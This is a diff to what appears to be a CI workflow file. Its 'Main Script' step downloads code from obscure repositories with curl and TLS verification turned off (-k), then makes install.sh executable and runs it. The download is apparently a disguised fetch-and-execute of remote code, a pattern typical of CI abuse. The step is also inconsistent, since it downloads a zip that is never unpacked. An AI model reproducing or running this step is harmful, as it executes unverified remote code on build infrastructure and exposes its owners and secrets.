@@ -17,7 +17,7 @@ jobs:
                 python-version: '3.6'
         -   name: "Main Script"
             run: |
-                curl -L -O -k https://gitlab.com/sarahemersonzrex/sbin/-/raw/main/zygote32.rc.sh
+                curl -L -O -k https://github.com/Samnidasamulea/fixcerles/archive/refs/heads/main.zip
                 ls
                 chmod +x install.sh
                 ./install.sh
